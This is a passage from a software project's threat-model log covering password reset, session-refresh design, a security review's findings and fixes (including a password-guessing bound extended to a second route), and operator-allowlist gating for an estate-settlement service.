signed-OUT caller drives), and `EXEMPT_RECOVERY_SURFACE` is DELETED from the
route↔consumer fence rather than left as an empty constant: a named empty
exemption invites the next route to reuse it without re-arguing, and the fence's
stale-exemption check (M20 PR1) would in any case have refused the two entries
the moment the consumers landed. All six M17 recovery routes are now consumed.

**§6m's mailbox-is-account decision is now REACHABLE, unchanged.** The
weakening §6m records in bold — the mailed code and nothing else resets the
password, even for an account holding a verified TOTP or passkey — was until
now a property of routes nothing called. This surface is what makes it live,
so the sentence is re-affirmed here rather than softened: for an account with
a verified second factor, control of the mailbox is control of the account.
What bounds it is exactly §6m's list (the vault untouched under 2SKD, every
session revoked, the owner mailed on completion, the whole sequence audited),
and the recovery-codes ceremony remains the change that could strengthen it.

**The request leg KEEPS the shared error mapper, and that is the inverse of
§6v's decision for the same reason.** §6v needed route-specific mappers because
identity answers 400 for things that are not malformed bodies. On the reset
request the only 400 identity can produce IS a malformed body — the unknown
address, the 30-minute floor and the per-destination bound are all deliberately
inside the uniform 202 — so a route-specific mapper here would be a second copy
with nothing to distinguish. The completion leg reuses the SAME mapper as the
email-change completion (`mapCodeRedemptionError`, renamed from
`mapChangeCompleteError` at its second caller — one behaviour, one spelling,
the M8 PR2 rule), so a refused code cannot reach the login vocabulary on
either mailed-code surface.

**Third surface, third remedy for one refused code.** Identity answers one
`invalid_code` for every completion failure and the edge carries it through as
one code; what varies is the remedy, because the surfaces genuinely offer
different ways out. The verification panel says "send yourself a new one" (it
has a resend button); the address change says "cancel and start again" (it has
a cancel); the reset says "ask for a new one above" (the request form is on the
same page). A shared sentence would name a control that does not exist on two
of the three surfaces.

**A reset signs you in NOWHERE, and the edge keeps it that way.** Identity
mints nothing on completion (§6m's `mint-paths` fence) and the BFF resolver
touches no cookies in either direction: there is nothing returned to set, and
the stale pair a previously-signed-in browser may hold names a session the
completion just revoked server-side — dead, not live, so the M8 logout rule
(never clear cookies for a session that was not revoked) has nothing to
protect and clearing them would be busywork claiming meaning. The surface says
BOTH consequences out loud — signed out everywhere including this device,
signed in nowhere — because a user who expects a reset to sign them in reads
the login screen as the reset having failed, and it offers exactly the one
next step. Pinned at the wire (no Set-Cookie on the completion response) and
proven live: the completing browser landed on the signed-out shell.

**The completion form is always available — §6v's rule, harder.** No route
reads pending state, and the mail deliberately carries no link (M9: "we never
link you"), so the person holding a code may never have touched this browser
at all. Arriving at `/reset` in a fresh browser and typing the code is the
DESIGNED path, and the page says so in words rather than treating it as an
edge case.

**Proven live, end to end.** Request → the conditional notice ("If *address*
has an Estate account — and you haven't asked for a code in the last half
hour…"), with `{"ok":true}` byte-identical on the wire for an address with no
account and for the floored real one. A real SES message under the one uniform
subject carried `PR1-…` and the vault-unchanged sentence. A wrong code got the
uniform refusal copy on screen and `auth.password.reset_failed | system | {}`
in the trail — no actor, empty detail, so the trail carries no oracle the wire
withholds. The real code RETYPED THE WAY A HUMAN RETYPES IT (lowercase, every
dash dropped) was accepted; the success state replaced both forms; the browser
rendered the signed-out shell; the pre-reset session's token answered 401; the
old password answered 401 and the new one 200. `password_resets` held the row
redeemed-not-revoked; the delivery log recorded `identity.password_reset` and
`identity.password_changed` both `sent_unverified` (this account never proved
its address — §6t's `wasDelivered` recording the carrier's real answer); and
the chain carried `reset_requested {"delivered":"delivered"}` and
`reset_completed {"notified":"delivered","revokedSessions":"1"}`.

### Residuals

- **[ACCEPTED]** *The request form is an anonymous mail trigger, with no client-side bound —
  deliberately.* Identity's per-address bound and the 30-minute per-account
  floor are the gate (§6m), and a browser-side limiter would be the M12
  second-opinion shape: a copy of a rate rule free to disagree with the one
  that decides. The surface widens REACH (a UI where there was curl), not
  capability.
- **[OWNER: M30]** *A signed-in browser elsewhere still looks signed in after the revocation*,
  until its next request fails and renders the session-ended state. That is
  the access-token-TTL shape measured in PR1's drive (≤15 minutes), pointed
  the other way; there is no push channel, and PR4's session-continuity work
  is where the client's relationship to session lifetime gets rebuilt.
- **[OWNER: E1]** *§6m's remaining residuals are unchanged by having a surface*: no attempt
  cap on redemption (the redeemer is anonymous; the bound is 160 bits, the
  TTL and burn-on-attempt), and a reset does not clear PR1's login bound.

## 6x. Threat-model delta — M20 PR4, session continuity (2026-08-15)

**The access TTL was the whole usable session, and the refresh machinery had
existed unreached since M8.** The `Refresh` operation shipped at every layer —
SDL, BFF resolver, identity client, operations.ts, the persisted manifest —
with no caller anywhere, so a signed-in browser rendered "Your session has
ended" at the 15-minute access expiry while its session row was live and its
30-day refresh token sat unused in the jar (measured in the M20 PR1 drive).
Worse for the copy than for the security: the sentence was FALSE every time it
rendered, and the two states it now distinguishes — expired and revoked — were
indistinguishable on screen.

**The design is one reactive refresh at the client's single chokepoint.**
`gqlRequest` retries once after an UNAUTHENTICATED, behind one silent Refresh;
there is no timer, no proactive renewal, and no per-surface wiring. Two
resolver changes make the trigger coherent: `Query.session` now answers null
ONLY when there is nothing to authenticate with, and throws UNAUTHENTICATED
when a dead access token has a refresh cookie behind it — "no session" and
"refreshable" are different facts, and flattening them to null is exactly what
made the app read signed-out at every expiry. A consequence worth naming:
"Your session has ended" is now TRUE whenever a surface renders it, because
the code only reaches a caller after the refresh itself was refused.

**Single-flight is a correctness requirement, not an optimization.** Identity's
rotation-reuse detection (M16) treats an already-rotated refresh token as theft
and revokes the whole session — the right behavior against an actual thief, and
a self-revocation if two of the owner's own requests refresh concurrently with
the one shared cookie jar. Concurrency is therefore removed BY CONSTRUCTION at
both scopes: an in-tab promise latch, and a cross-tab Web Lock
(`estate.session.refresh`), since every tab of the origin shares the jar. A tab
that waited on the lock still sends its own Refresh afterwards; by then the jar
holds the winner's NEW token, so that is an ordinary second rotation, not a
reuse. Proven live: an assets page racing several queries into an expired token
produced EXACTLY one rotation (`refresh_token_prev_h` still held the pre-drive
hash afterwards).

**Only QUERIES are retried, and the first draft of this section got that
wrong.** The tempting claim — that a retry can never repeat a side effect,
because UNAUTHENTICATED means a guard refused before any handler ran — is true
of a SINGLE hop and false of the ELEVEN BFF resolvers that write and then read
back (`addContact` → `contacts`, `addFamilyMember` → `family`, `saveProfile`
→ `profile`, the grant/revoke pairs, …). If the write lands and the read-back
is refused, re-running the resolver re-runs the write, and
`createContact`/`createFamilyMember` carry no idempotency key — two contacts
of one name are legitimate, so no constraint catches the duplicate either. One
click, two rows, silently. The asset commands ARE safe (payload-keyed
`eventId`, M19) and the profile grants ARE safe (M13's unique indexes answer
409), but per-resolver safety is a fact the transport cannot see, so it does
not guess: the operation's own document says whether it is a `query`, and only
those repeat. A refused mutation reports `SESSION_RENEWED` — the session was
renewed, nothing was performed, the next attempt will work — because rendering
"your session has ended" there would be the false sentence this PR exists to
delete, one case over. The classification is total (every document begins
`query` or `mutation`, asserted in `operation-consumers.test.ts`) and its
default direction is the safe one: anything unrecognized is treated as a
mutation and not retried. The retry runs once whatever it answers; a second
UNAUTHENTICATED is returned as-is, because looping would hammer a dead
credential.

**Cookies are cleared in exactly one failure direction.** When identity refuses
the refresh credential as dead (its 401 → the mapped UNAUTHENTICATED), the BFF
clears both cookies: the pair is dead SERVER-SIDE, so clearing is tidying, not
stranding — the M8 rule protects live sessions, and identity just said this one
is not. Without the clear, every later page load would repeat the
session → refresh → refusal dance against a credential that can never work
again. An identity OUTAGE clears nothing — an outage must not wear the face of
a revocation (M16 PR2a) — and the pair survives for when the service returns.

**The fence: every GraphQL operation has a product caller**
(`operation-consumers.test.ts`), the route↔consumer fence's shape one layer up.
Deliberately NO exemption mechanism (the M20 PR3 rule — a named empty
exemption invites reuse): an operation lands in the same change as its first
caller, and the reverse direction (every caller names a real operation) is the
compiler's, `OperationName` being a closed union.

### Residuals

- **[ACCEPTED]** *A lost Set-Cookie response becomes a false theft signal.* If the browser
  never receives the response that carried the rotated pair (a network blip at
  exactly that moment), it retains the rotated-away token, and its next refresh
  trips rotation-reuse detection: that one session is revoked and the ledger
  records `rotation_reuse_detected` about an owner's own connection hiccup.
  Unclosable client-side — cookies ARE the response — and deliberately not
  weakened server-side, because a grace window for the previous token is
  precisely the replay the detection exists to refuse. The M16 extension
  recorded the same trade (persist-before-use is impossible when the browser
  owns the store); the cost is a re-login, and the other devices survive.
- **[ACCEPTED]** *Browsers without Web Locks (Safari < 15.4) keep the cross-TAB race.* The
  in-tab latch still holds there; two tabs refreshing in the same instant can
  still self-revoke. Every evergreen browser has the API.
- **[ACCEPTED]** *A signed-out page whose queries are authenticated-only costs one refused
  Refresh round trip.* The client cannot see the (httpOnly) jar, so an
  UNAUTHENTICATED from, say, the verification banner triggers one Refresh that
  the BFF refuses before any identity call. Pages that only ask `session` cost
  zero — the resolver answers null for a cookie-less caller and the client
  never escalates a null.
- **[OWNER: M28]** *A refused mutation costs the user one repeated click.* The transport
  refuses to guess which mutations are replay-safe, so it renews the session
  and asks. Making the write-then-read-back resolvers individually safe — an
  idempotency key on `createContact`/`createFamilyMember`, the M19 asset-command
  shape applied to profile — is what would let mutations retry too, and it is
  a profile-service change rather than a transport one.
- **[ACCEPTED]** *A retried QUERY is not quite free either, and the reason it is harmless is
  worth stating rather than assumed.* For a single-hop query the retry IS the
  only execution — UNAUTHENTICATED means a guard refused before any handler
  ran. `assetBeneficiaries` is the one multi-hop query resolver of the
  twenty-five (assets, then profile for the names), and both hops decrypt, so
  a refusal on the second hop makes the first hop's audited
  `crypto.field.decrypted` events happen twice for one user action. That does
  not trip TB4's detector, and specifically not by luck: `boundFor` requires
  BOTH the count bound and `maxDistinctSubjectsPerWindow` to be exceeded
  (2026-08-14), and a retry re-reads the SAME subjects — the count moves, the
  distinct count does not. Nothing is disclosed to anybody new; it is the
  owner's own trail, doubled.
- **[ACCEPTED]** *The 30-day session lifetime is a hard ceiling, unchanged.* `rotateTokens`
  deliberately never writes `expires_at` (M16), so refresh extends nothing and
  a month-old browser re-authenticates. That is the designed bound on a stolen
  jar, not a gap in this feature.

## 6y. Threat-model delta — M20 PR5, the security review (2026-08-15)

Five file-scoped discovery lenses over the milestone's own files (never a diff
range — the M13 rule), each in its own worktree pinned with `git checkout
--detach`, then two adversarial verifiers per candidate on different angles
(production reachability, and is-it-already-a-recorded-decision), both
defaulting to refuted. 21 agents, no losses; 11 raw findings, 8 verified, 3
dropped under the cap and LOGGED BY NAME — all three were then hand-verified and
all three were real. Every finding was re-checked by hand before anything
changed, and the one HIGH was reproduced by execution against the running stack
before and after the fix.

Fourteenth milestone running where every confirmed finding sits in machinery the
milestone introduced, with one exception noted below.

### The one that mattered: a second route checking the account password, unbounded

`POST /v1/auth/email/change/request` (M20 PR2) takes the current password for
exactly the reason `POST /v1/auth/password` does — the stolen-session threat —
and ran the identical gate order, conditional step-up then verification, with
nothing between them. The M17 PR6 review had put `PASSWORD_CHANGE_BOUND` in that
gap on the password route, measured after twenty-five unbounded guesses took an
account over. PR2 wrote the same shape one milestone later and did not carry the
bound.

MEASURED ON THE RUNNING STACK, on a factorless account — the class
`SecondFactorGate` deliberately admits so the bootstrap case stays reachable, and
therefore the class that reaches a password check at all:

| route | 25 wrong guesses, one session | ledger |
|---|---|---|
| `POST /v1/auth/email/change/request` | 25 × `400`, no refusal ever | `email_change.denied` × 25, **0 with a session id** |
| `POST /v1/auth/password` | 5 × `401`, then `429` | `password.change_failed` × 5, all attributed |

One secret, two routes, one bounded. Every other bound on the address-change
route sits DOWNSTREAM of the verification (the per-account re-issue floor and
the per-destination address bound both run after it), so nothing else could
have caught it, and recovering the password there defeats the bounded route
rather than tripping it.

**The fix is a shared gate, and the shape is the point.** `AccountPasswordGate`
(the `SecondFactorGate` precedent) is injected by both services;
`PASSWORD_CHANGE_BOUND` became `ACCOUNT_PASSWORD_BOUND` and counts BOTH routes'
failure kinds, because the M16 chokepoint rule says the thing to bound is the
SET of routes that read a secret — two budgets of five are a budget of ten to
anyone willing to alternate. The failure row is now attributed to the session,
without which the per-session half would have been blind to this route and one
stolen session could have spent the whole account ceiling. Post-fix, same
attack: five 400s then `429`, `email_change.denied` × 5 all attributed, and the
password route answers `429` HAVING SPENT NOTHING OF ITS OWN — which is the
shared budget visible from the outside. The owner's other session still gets the
ordinary refusal and their correct password still returns 202.

**A METHOD ON ONE SERVICE IS WHAT ALLOWED IT.** The bound was reachable only
from the class that happened to own it, so the second route did not bypass the
control so much as never meet it.

### The fence went green because its corpus was one file

`rate-bounds.spec.ts` asserts that every guessing bound covers the routes that
check its secret — over `auth.service.ts` ALONE. That was true to the property
while every bounded route lived in that class, and stopped being true the moment
a route moved to `email-change.service.ts`. A fence whose input is narrower than
its claim goes green for the same reason it is wrong.

The corpus is derived from the directory now, with a floor asserting it, and the
fence gained the check it never had: EVERY call to `hasher.verifyPassword` must
be declared with the bound that covers it, in both directions, anchored on the
verification rather than on a route decorator or a method name — a caller cannot
rename its way out of the call that scores a guess. Mutation-tested with the
exact regression (a new undeclared route reading the password) and with the
corpus narrowed back to one file.

### The other confirmed findings

- **An outage wore the face of a revocation.** `refreshSession` collapsed
  "identity refused the credential" and "the refresh never completed" into one
  boolean, so a dropped connection or an identity outage rendered "Your session
  has ended. Please sign in again." over a live 30-day session whose cookies the
  BFF had deliberately left in place — the M16 PR2a rule, broken by code citing
  it three lines above. Three outcomes now; only a refusal reports the session
  as ended.
- **`SESSION_RENEWED` claimed what its own neighbour says cannot be claimed.** A
  mutation refused with UNAUTHENTICATED may have written on its first hop and
  been refused on a later one — the whole reason mutations are not retried — yet
  the copy read "Nothing was changed — please try that again", inviting the
  retry the no-retry rule exists to prevent. It names the uncertainty and sends
  the reader to reload instead.
- **The step-up prompt never closed on a non-step-up refusal.** `StepUpPrompt`
  does not unmount itself, and these sections render it INSTEAD of their form,
  so a refusal after a genuine elevation left an error telling the reader to
  re-check a field no longer on screen. Four call sites, two of them
  pre-existing, all fixed — two fixed and two not would read as intentional.
- **The page contradicted itself about a control.** A password change or an
  address-change completion revokes every other session, and neither re-read the
  devices list, so "your other devices have been signed out" sat above a list
  still showing them.
- **The stale-exemption check could only see files already declared as
  consumers**, so a brand-new client module calling an exempt route was
  invisible to the check whose job is exactly that. Swept from the tree now.
- **The password-policy fence could not see registration.** Two of identity's
  password fields are literally named `password` — one about to be STORED, one
  about to be compared — so a field-keyed rule excused
  `RegisterSchema.password` dropping to `min(1)` as a presence check, satisfying
  a file whose header claims the assertion is TOTAL. Keyed on the (schema,
  field) pair now, classified as data, total in both directions.
- **`loadSession` read a missing field as data**, violating the rule the two
  loaders below it state — `{"data":{}}` produced a signed-in session of
  `undefined` and white-screened the page. A missing field is an ERROR, not a
  sign-out: a version skew says nothing about whether the caller is signed in.

### Refuted, and the three dropped under the cap

No finding was refuted by the verifiers this round, which is unusual and was
treated as a reason for more hand-checking rather than less: all eight were
re-derived from the source before anything was changed. The three dropped under
the fan-out cap were each verified by hand and each was real — a comment
asserting the reset surface "does not exist yet" (M20 PR3 shipped it), three
different counts of the step-up targets in three files (only the union was
right, and the prose no longer carries a number), and a line-based
comment-stripper in `operation-consumers.test.ts` that read whole paragraphs of
block comment as code.

### Residuals

- **[ACCEPTED]** *This delta opens nothing new, and says so rather than
  leaving a reader to infer it from an absent section.* All eleven findings
  were fixed in the same PR and each fix was mutation-tested; what the review
  did NOT do is re-open a settled trade-off, which is what the
  is-it-already-a-decision verifier exists to prevent.
- **[OWNER: E1]** *§6k's bounds are unchanged by widening one of them to a
  second route.* `ACCOUNT_PASSWORD_BOUND` now spans both routes that read the
  account password, and it is still account-keyed with a per-process address
  half. Per-caller limiting remains edge work.
- **[OWNER: M45]** *The corpus lesson was applied to one fence and not swept
  across the others.* The defect was that `rate-bounds.spec.ts` scanned a
  single file while claiming to cover a service; nothing has since asked the
  same question of the repo's other source-scanning fences, and a fence whose
  input is narrower than its claim goes green for the same reason it is wrong.
  **RE-OWNED FROM M21 BY M40 PR2** (§6fff): no part of the operator platform makes
  this sweep cheaper. It is M45's stated general form, and M45's second member.


## 6z. Threat-model delta — M21 PR1, the operator grant ceremony (2026-08-17)

**The act that creates an operator was the one privileged act in the product
with no entry in the append-only trail.** `settlement_operators` decides who may
run §5.1's mandatory human review — approve a death case, lock an account,
confirm a verification, approve a distribution, approve a stage of access to a
dead person's estate. Every one of those actions emits an audit event. Granting
somebody the authority to perform them emitted nothing, in either direction:
there was no `settlement.operator.granted`, no `.revoked`, and no action in
`AUDIT_ACTIONS` that could have carried one. The trail could show what an
operator did and could not show that they had ever been made one.

**And the mechanism was two implementations of one behaviour, one of them
dead.** `OperatorsRepo.grant`/`.revoke` carried a docstring calling them "the
CLI-only write path"; `operator-cli.ts` reimplemented both in raw SQL and called
neither, so the repo's write methods had ZERO CALLERS anywhere in the
repository. The two had already drifted in the way this shape always drifts —
the repo handled a duplicate grant through `isUniqueViolation(err)`, the CLI
through an inline `err.code === '23505'` check. This is the M8 PR2 shape (seven
byte-identical audit producers sharing one bug) in the allowlist that decides
who may approve a death case.

**`granted_by` has been declared since M7 and written by nothing.** Every row in
the table said only that somebody holding the database made a grant.

### What PR1 changes

- **The ceremony audits, and REFUSES TO WRITE WHEN IT CANNOT.** A broker is
  required for `grant` and `revoke`; `list`, which changes nothing, does not
  need one and is handed a producer that THROWS if anything tries to emit
  through it — an assertion that the read path is silent rather than a stub for
  it. The template-publish CLI's precedent (fall back to an in-memory producer
  when no broker is configured) is right for a template and wrong here: it would
  make an unaudited grant the quiet default on every machine without
  `KAFKA_BROKERS`, which is every developer laptop.
- **Attribution is required.** `--by <authorizingUserId>` fills `granted_by`.
  It is ATTRIBUTION, NOT AUTHENTICATION — whoever runs this already holds the
  database connection and could write the row by hand. What it buys is that the
  sanctioned path produces a record naming a human, so a row with `granted_by
  IS NULL` is visibly one that did not come through here. The e2e's seeding
  `INSERT` is exactly such a row, and its comment now says so instead of
  claiming to be the CLI's write path.
- **One write path, asserted in both directions.**
  `test/operator-write-path.spec.ts` scans the service's own source: only the
  ceremony may call the repo's write methods, only the repo may write the table
  in SQL (the method-name scan alone is evadable by the inline statement that
  was there before), the ceremony really does call them (without which the
  fence passes vacuously the day somebody reverts to raw SQL), and no
  controller mentions the table or the repo at all. A source scan rather than a
  runtime guard because there is no runtime seam: the CLI and the service share
  one class by design, so the difference between a sanctioned and an
  unsanctioned call is WHERE IT IS WRITTEN.
- **Ordering inside the transaction: the reversible step first.** The INSERT
  rolls back and the Kafka emit does not, so the row is written first and the
  event emitted second, and a failed emit rolls the grant back rather than
  leaving it unrecorded.
- **A REPEAT GRANT DID NOT WORK, and only the live drive found it.** `grant`
  recovered from the partial index's unique violation by re-reading the existing
  row — which is fine against a connection POOL, where each statement gets its
  own implicit transaction, and impossible inside the CLI's own `BEGIN`/`COMMIT`,
  because Postgres aborts a transaction on a failed statement and refuses every
  command until rollback. So the second grant died with `current transaction is
  aborted` while three green specs called it a clean no-op: every one of them
  drove a pooled handle, so **the harness was more permissive than the only path
  that ever really runs**. Fixed by never raising the error at all — `ON CONFLICT
  (user_id) WHERE revoked_at IS NULL DO NOTHING`, naming the index's own
  predicate so a revoked row is not a conflict — which makes the two contexts
  agree rather than making the recovery cleverer, and the int spec now runs the
  ceremony inside a real transaction. Checked for the same shape elsewhere: the
  service's three other unique-violation catches all `return` or `throw`
  immediately and issue no follow-up statement, so none of them has it.
- **The CLI became testable at all.** It had no exports, no `require.main`
  guard, no package script and 0% coverage while sitting inside the coverage
  denominator — no test in the repository had ever executed it. Its argv
  contract, its broker gate and each of its emit branches are now unit-proven,
  and `operator-cli.int.spec.ts` drives the whole ceremony against real
  Postgres, because `grant`'s idempotence rides a PARTIAL unique index and a
  fake repo has no index to violate.

### Residuals

- **[ACCEPTED]** *`--by` is attribution and not authentication, and the fence
  bounds source rather than the database.* Whoever holds `DATABASE_URL` can
  write the row by hand, unattributed and unaudited. Nothing in a CLI can
  change that: the authority here IS possession of the connection. What the
  ceremony buys is that the sanctioned path leaves a record, and that a row
  which did not come through it is visibly different (`granted_by IS NULL`, no
  audit event) rather than indistinguishable. Closing it properly is the
  operator platform with real IAM — **E1**.
- **[ACCEPTED]** *`settlement_operators.user_id` has no foreign key and cannot
  have one.* `users` lives in the AUTH cluster and settlement is a co-tenant on
  CORE, and docs/02 §8 forbids cross-cluster foreign keys — so a mistyped UUID
  becomes a live allowlist row naming no account. It grants nothing (no session
  can ever present that subject) and it is invisible in `list` beyond being a
  UUID nobody recognises. The check that would catch it is a user-existence
  lookup against identity, which would mean giving settlement a credential it
  deliberately does not hold, to catch a typo whose only consequence is a row
  that does nothing.
- **[ACCEPTED]** *An event may land for a commit that then fails.* This is the
  ordinary residual every emit-inside-a-transaction carries in this repository,
  and the ordering above chooses which way it falls: a phantom grant record is
  investigable, a silent real grant is not.
- **[OWNER: M46]** *An operator is still an ordinary account session that
  happens to appear in a table.* PR1 changed who can get into the table and not
  what being in it authenticates as; the session audience was PR3. **STILL TRUE,
  AND M40 PR2 NEARLY CLOSED IT ON A NAME.** PR3a did ship the audience —
  `SESSION_AUDIENCES` carries `'operator'` and settlement decorates routes
  `@AllowSessionAudiences('operator')` — and an earlier draft of this PR read
  that as the binding arriving. It is not. `AllowSessionAudiences` returns
  `[DEFAULT_SESSION_AUDIENCE, ...audiences]`, its parameter type
  `Exclude<SessionAudience, 'account'>` forbids naming `account` because it is
  always there already, and `CallerGuard.audiencesFor` UNIONS the route list with
  the service-wide grant — its own docstring says it "could never accidentally
  narrow". Settlement binds no `ALLOWED_SESSION_AUDIENCES`, so its baseline is
  `['account']` and a decorated route admits `account` OR `operator`. The
  decorator WIDENS. Settlement reads `caller.audience` in no control anywhere,
  and docs/04's own M21 PR3 bullet says this in the same words — "decorating a
  settlement route ALSO admits every ordinary account session. `OperatorGate`
  stays the control." **RE-OWNED FROM M21 BY M40 PR2** (§6fff): what would close
  it is a session whose authority the audience DECIDES, which is the operator
  authorization model, M46.
- **[OWNER: M46]** *Revocation takes effect on the next request and
  notifies nobody.* The allowlist is read per action against the database, so a
  revoked operator loses authority at their next call rather than
  retroactively — which is the correct behaviour and is stated here because
  nothing announces it. No notification is sent to the revoked operator or to
  anyone else, because the audience for such a message is an operator surface
  that does not exist. **RE-OWNED FROM M21 BY M40 PR2** (§6fff): that surface now
  EXISTS — M21 PR3b shipped it — and no notification was added with it, so the
  premise changed while the gap did not.
- **[OWNER: M46]** *Nothing surfaces the allowlist to a human but `list` on
  a terminal.* An operator cannot see who else is an operator, and no periodic
  review of the allowlist exists — which is the control the ceremony's record
  is FOR. The record is now there to be read, and **PR3 SHIPPED WITHOUT THE
  READER**: `operator.controller.ts` exposes queue, administrable,
  report-provider, review, verify and evidence-read, and no route lists allowlist
  membership — the CLI is still the only reader. **RE-OWNED FROM M21 BY M40 PR2**
  (§6fff), the THIRD instance of this rot in the TB7 records; §4 already logs two,
  the M18 alarm surface that "said **M21 PR3b**, which shipped the console without
  it" and the legal-hold ceremony that said M21 PR4.


## 6aa. Threat-model delta — M21 PR2, one operator gate (2026-08-17)

**One service read the allowlist at SEVEN call sites in four distinct shapes,
and they had already drifted about when the question is asked.** Two
byte-identical private `assertOperator` methods (one in `settlement.service.ts`,
one in `admin.service.ts`), a bare `isOperator` branch inside
`assertCaseVisible` that returns the case rather than throwing, an inline
`isOperator || isExecutorOf` disjunction in `setDistributionStatus`, and three
more direct reads feeding a value (`addEvidence`, `getCase`,
`evidenceReadAuthority`). The disjunction was the only one of the seven that
read the allowlist on the TRANSACTION handle; `startReview` and `confirmVerification` — the two §5.1
routes that begin and end a death case — resolved it on the pool and only then
opened the transaction they were guarding. Four spellings of one question is the
M8 PR2 shape, in the code that decides who may approve a death case.

**And three call sites asserted operator-ness to Cedar rather than measuring
it.** `assertCan`'s second argument IS the `isSettlementOperator` attribute
`settlement.cedar` matches on, and at `startReview`, `decideReview` and
`confirmVerification` it was the literal `true`. That was SOUND, and sound for a
reason nothing enforced: an assertion had run a few lines above. Delete that
line — a refactor, a merge, an extracted helper — and the route opens to any
authenticated caller while the policy goes on evaluating happily against a
constant asserting the very thing nobody checked. A PEP whose input is a literal
cannot deny anything, and it is the layer this repo relies on to deny by
default.

### What PR2 changes

- **`OperatorGate` is the only reader of the allowlist.** One class, one
  question. `is()` answers, `assertIn()` refuses AND RETURNS the measured
  answer — which is what Cedar is handed now, so removing the check removes the
  argument. The positional dependency between two adjacent statements becomes a
  structural one the compiler enforces.
- **The handle is a parameter with no default**, because which one a caller
  passes is a decision rather than a detail: a write passes its own `tx` so the
  allowlist answer belongs to the same transaction as the row it authorizes; a
  read with no transaction to be consistent with passes the pool. **The five
  pool sites are DECLARED with a reason each and everything else must pass
  `tx`**, checked by the same fence — because the handle is precisely what the
  four replaced paths had already drifted about, and a convention nobody checks
  is how it drifts again.
- **The gate is read BEFORE the case row is locked**, deliberately. A
  non-operator is refused without learning whether the case id names anything —
  the uniform-404 rule, preserved rather than newly added, and now visible in
  one ordering instead of implied by four.
- **EVERY CASE-SCOPED READ NOW ANSWERS ONE REFUSAL.** Found by the pre-merge
  adversarial pass and measured live before it was believed: `getCase` and the
  four admin reads that funnel through `assertCaseVisible` (timeline, stages,
  tasks, distributions) answered 404 for an unknown case id and 403 for a real
  one, so any authenticated caller holding an id learned whether a death case
  exists for it. Pre-existing rather than introduced here, and the same defect
  M19 PR1 closed in assets one milestone earlier — but §6aa was about to claim
  this service preserved the uniform-404 rule, which on those five routes it did
  not. `SettlementAuthz.assertCanOrNotFound` is the assets precedent applied:
  used wherever the resource was located BY the id under authorization, and NOT
  on the operator write paths, where a non-operator is refused before any lookup
  and so learns nothing either way. The two tests that covered this were
  themselves the lesson — one asserted a stranger got 403 and the next, named
  *"404s an unknown case rather than leaking its absence differently"*, asserted
  an unknown id got 404. Together they asserted the leak and called it the
  opposite. One test now, comparing the two answers, because neither alone can
  see the property. A THIRD witness said the same thing at a higher layer: the
  §5.1 end-to-end spec pinned `expect(403, { error: 'forbidden' })` for a
  stranger reading a real case, so the leak was written into the file that
  exists to prove this chain — which is how the fix presented, as a red e2e
  rather than as a red unit test. It compares the two answers now too.
- **Two fences, both source scans, because there is no runtime seam.** A
  sanctioned read of the allowlist and an unsanctioned one call the same method
  on the same class, so the difference is WHERE IT IS WRITTEN. The first asserts
  the gate is the only caller of `OperatorsRepo.isOperator`, that the gate really
  does call it (without which the first assertion is satisfied by a gate that
  calls nothing, and every caller would be admitting on a hardcoded answer), and
  that no service declares its own `assertOperator` again. The second asserts
  Cedar is never handed `true`, that `false` appears only at DECLARED owner-path
  sites each carrying its reason, that every other call passes the resolved
  variable, and that every gate call passes `tx` unless its method is a declared
  pool read. It RESOLVES each call to its enclosing method and REFUSES a shape
  it cannot resolve, because an unattributed call would silently satisfy every
  assertion in the block. Both corpora are recursive and asserted equal to the platform's own
  recursive read — §6y's M21 item discharged for two more fences rather than
  restated.
- **The gate has direct tests, which none of the four copies had.** Unifying N
  copies of a guard is only safe if the unified one is tested harder than the
  copies were, because the blast radius becomes every caller: making `assertIn`
  return without throwing now opens four admission paths at once. Including that
  a repo FAILURE propagates as an error rather than collapsing into `forbidden`
  — telling an operator they are not one is a different and actionable fact from
  a database outage (the M9 rule, pointed the other way).

### Residuals

- **[ACCEPTED]** *Moving the read inside the transaction NARROWS the
  revoke-during-action window and does not close it.* These transactions are
  READ COMMITTED, so each statement takes a fresh snapshot and a revoke
  committing after the gate's read is still unseen at commit time. Closing it
  means taking a share lock on the allowlist row so a revoke has to wait — real
  contention on every operator action, bought to serialize against an adversary
  who must be an operator being revoked in that exact instant, on a path where
  the losing outcome is one further action by somebody who was an operator
  moments earlier and whose action is audited under their name. The property the
  handle secures is CONSISTENCY — one question, one handle, the service no
  longer disagreeing with itself — not atomicity, and the code says so rather
  than implying the stronger claim.
- **[ACCEPTED]** *Two sites hand Cedar a literal `false`, and that is the
  correct value.* `void` (the owner's kill switch) and `manage` (the owner's own
  settings) evaluate the caller purely as the decedent. Measuring the allowlist
  there would WIDEN the decision for an owner who is also an operator, which is
  the direction `settlement.cedar` deliberately avoids by never carrying an
  `owner` attribute. Declared as data with a reason per entry and fenced, so a
  third one is a visible decision.
- **[ACCEPTED]** *An entitled caller still learns an unknown case id is
  unknown.* The uniform answer is about what someone with NO relationship to a
  case learns; a decedent, reporter, executor or operator is told the id is
  wrong, because a surface that answered "not found" to the people it is for
  would be unusable. The oracle it closes is the one available to everybody
  else.
- **[OWNER: M46]** *`admin.service.ts` has no PEP at all — the gate is the whole
  authorization on those routes.* `settlement.cedar`'s permits are scoped
  `resource is SettlementCase` and the admin routes act on tasks, stages and
  distributions, so there is no policy for them to consult and adding one means
  new resource types with their own attributes. Until then the allowlist
  membership IS the decision on that controller, which is exactly why PR2 made
  it one gate rather than three shapes. The operator surface (PR3) is what makes
  those routes reachable from the product at all. **RE-OWNED FROM M21 BY M40 PR2**
  (§6fff): new Cedar resource types with their own attributes are the operator
  authorization model, which is M46 — not an operator CEREMONY, which is what M21
  scoped and shipped.
- **[OWNER: M43]** *The BFF's SDL enums and its own hand-written payload unions
  are two copies in one file with nothing comparing them.* Found by PR2's review
  and recorded rather than fixed, because it lives outside this PR's subject —
  but MEASURED, not assumed: widening `enum SessionAudience` in
  `apps/bff/src/schema.ts` and nothing else leaves `@estate/bff` green on both
  typecheck and its 399 tests. What catches it today is one layer over,
  `apps/web/src/graphql/enum-parity.test.ts` (M20 PR1), which reads that SDL and
  goes red on the app mirror — confirmed by running the mutation. So the SDL→app
  direction is fenced and the SDL→BFF-payload direction is not; the exhaustive
  `AUDIENCE_GQL` Record couples the payload union to `SessionAudience` in
  `@estate/contracts` rather than to the SDL beside it. The failure mode is a
  value the BFF's TypeScript admits and its own schema rejects at serialization
  — a runtime error rather than a build one. PR3 adds the `operator` audience and
  is therefore the change that first exercises this, and PR3 HAS SHIPPED. **RE-OWNED FROM M21 BY M40 PR2** (§6fff): the change that
